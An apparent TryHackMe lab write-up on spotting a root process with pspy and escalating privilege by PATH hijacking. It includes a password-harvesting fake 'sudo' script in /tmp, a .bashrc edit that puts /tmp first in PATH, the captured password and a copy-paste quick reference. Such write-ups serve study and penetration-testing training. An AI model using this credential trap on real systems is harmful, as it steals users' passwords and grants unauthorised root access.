# LAB — Process Snooping with pspy (PATH Hijacking)

## What is pspy?

**pspy** is a command-line tool that monitors processes **without requiring root privileges**. It reveals commands run by other users, cron jobs, and services as they execute in real time.

- **Source**: [github.com/dominicbreuker/pspy](https://github.com/dominicbreuker/pspy)
- **How it works**: Scans `/proc` filesystem + uses inotify watchers on key directories to catch short-lived processes

![](attachments/Pasted%20image%2020260921182128.png)

### pspy Flags

| Flag | Description |
|---|---|
| `-p` | Print commands to stdout (enabled by default) |
| `-f` | Print file system events to stdout (disabled by default) |
| `-r` | Directories to watch recursively with inotify (default: `/usr`, `/tmp`, `/etc`, `/home`, `/var`, `/opt`) |
| `-d` | Directories to watch non-recursively (empty by default) |
| `-i` | Interval in ms between procfs scans |
| `-c` | Color commands by process UID |
| `--debug` | Print verbose error messages |

---

## How `/proc` Exposes Process Info

Every running process gets a directory `/proc/<PID>/` containing its attributes. The file `/proc/<PID>/cmdline` is **readable by all users** — it reveals the exact command line used to launch the process, including all arguments, flags, and paths.

```
┌──(kali㉿kali)-[/proc]
└─$ cd 26076

┌──(kali㉿kali)-[/proc/26076]
└─$ ls
arch_status         cwd                loginuid    oom_adj        sessionid     timens_offsets
attr                environ            map_files   oom_score      setgroups     timers
autogroup           exe                maps        oom_score_adj  smaps         timerslack_ns
auxv                fd                 mem         pagemap        smaps_rollup  uid_map
cgroup              fdinfo             mountinfo   patch_state    stack         wchan
clear_refs          gid_map            mounts      personality    stat
cmdline             io                 mountstats  projid_map     statm
comm                ksm_merging_pages  net         root           status
coredump_filter     ksm_stat           ns          sched          syscall
cpu_resctrl_groups  limits             numa_maps   schedstat      task
```

> [!NOTE]
> Doing this manually for every PID is slow — that's why we use `pspy` to automate it.

## pspy vs. Manual Cron Inspection

| Manual Inspection | pspy |
|---|---|
| Shows jobs configured in accessible cron files | Shows commands when they actually execute |
| May miss jobs you can't read | Reveals execution activity without reading cron files |
| Must inspect multiple locations | Monitors all activity in real time |
| Shows configuration | Shows actual processes and commands |

| Question | Tool |
|---|---|
| What cron jobs are configured? | `cat /etc/crontab`, `crontab -l` |
| What commands are executing right now? | `pspy` |
| Is a scheduled root script writable? | `ls -l /path/to/script` |

**OSCP approach**: First inspect cron manually → if nothing useful, run `pspy64` and wait for scheduled processes.

### Manual Cron Enumeration

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
crontab -l
```

## Lab Walkthrough — TryHackMe (PATH Hijacking via pspy)

### Environment Setup

```bash
# SSH into target
ssh frank@10.114.150.227 -i id-rsa-1647296932800.id-rsa
```

### Step 1 — Transfer and Run pspy

```bash
# On Kali
python3 -m http.server 8000

# On target
wget http://192.168.131.128:8000/pspy64 -O pspy64
chmod +x pspy64
./pspy64
```

### Step 2 — Analyze pspy Output

```
2026/09/21 13:17:34 CMD: UID=1000  PID=2563   | ./pspy64
2026/09/21 13:17:34 CMD: UID=1000  PID=258    | -bash
2026/09/21 13:17:34 CMD: UID=0     PID=232    | sshd: frank [priv]
2026/09/21 13:17:34 CMD: UID=0     PID=1      | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
2026/09/21 13:20:56 CMD: UID=0     PID=2960   | sudo cat /etc/shadow
2026/09/21 13:21:19 CMD: UID=1000  PID=2984   | /bin/sh /etc/init.d/hwclock.sh status
2026/09/21 13:21:21 CMD: UID=0     PID=3005   | sudo cat /etc/shadow
```

**Key observation**: `UID=0` is running `sudo cat /etc/shadow` repeatedly.

> [!IMPORTANT]
> `UID=0` means root. But why would root use `sudo`? Because another user (`frank`) is calling `sudo` from their session — and `sudo` is invoked **without an absolute path**. This means we can do **PATH hijacking**.

### Step 3 — Create Fake `sudo` Script

```bash
cd /tmp
nano sudo
```

Enter this password-harvesting script:

```bash
#!/bin/bash

read frank_pass
echo $frank_pass > /tmp/frank_pass
# it will print what user enters in /tmp folder
# go and see by `ls -al /tmp` then cat that `cat /tmp/frank_pass`
```

Make it executable:

```bash
chmod +x sudo
```

### Step 4 — Test the Fake sudo Locally

```
frank@workstation:~$ ./sudo
testcommand

frank@workstation:~$ ls -al /tmp
total 12
drwxrwxrwt 1 root  root  4096 Sep 21 13:26 .
drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
-rw-rw-r-- 1 frank frank   12 Sep 21 13:26 frank_pass

frank@workstation:~$ cat /tmp/frank_pass
testcommand
```

✅ Script captures input correctly.

### Step 5 — PATH Hijacking via `.bashrc`

We need `/tmp` to appear **first** in `$PATH` so when `frank` types `sudo`, our fake script runs instead of `/usr/bin/sudo`. Edit `.bashrc` for persistence across new sessions:

```bash
cd ~
nano .bashrc
```

Add at the top (after comments):

```bash
PATH=/tmp:$PATH
```

Save and apply:

```bash
source .bashrc
```

Verify:

```
frank@workstation:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Clean up the test file:

```bash
rm -rf /tmp/frank_pass
```

### Step 6 — Wait and Capture the Password

Wait for the user to run `sudo` again. Then check:

```
frank@workstation:/tmp$ ls -al
total 16
drwxrwxrwt 1 root  root  4096 Sep 21 13:42 .
drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
-rw-rw-r-- 1 frank frank   24 Sep 21 13:42 frank_pass
-rwxrwxr-x 1 frank frank   64 Sep 21 13:38 sudo

frank@workstation:/tmp$ cat frank_pass
!@#frankisawesome2022%*
```

✅ **Password captured!**

### Step 7 — Cleanup and Escalate to Root

Remove the PATH hijack from `~/.bashrc`, then apply:

```bash
nano ~/.bashrc    # Remove the PATH=/tmp:$PATH line
source ~/.bashrc
```

Use the **full path** for sudo since PATH is restored:

```bash
/usr/bin/sudo -l
```

```
frank@workstation:/tmp$ /usr/bin/sudo -l
[sudo] password for frank:
Matching Defaults entries for frank on workstation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on workstation:
    (ALL : ALL) ALL
```

`frank` has **unrestricted sudo** — escalate to root:

```
frank@workstation:/tmp$ /usr/bin/sudo su
root@workstation:/tmp#
```

```
root@workstation:~# cat flag.txt
flag{14370304172628f784d8e8962d54a600}
```

## Quick Reference — pspy + PATH Hijacking

```bash
# 1. Transfer and run pspy
chmod +x pspy64 && ./pspy64

# 2. Look for UID=0 processes using relative paths (e.g., "sudo" not "/usr/bin/sudo")

# 3. Create fake binary in /tmp
cat << 'EOF' > /tmp/sudo
#!/bin/bash
read frank_pass
echo $frank_pass > /tmp/frank_pass
EOF
chmod +x /tmp/sudo

# 4. Hijack PATH in .bashrc
echo 'PATH=/tmp:$PATH' >> ~/.bashrc
source ~/.bashrc

# 5. Wait → cat /tmp/frank_pass → get password

# 6. Cleanup .bashrc, then: /usr/bin/sudo su
```
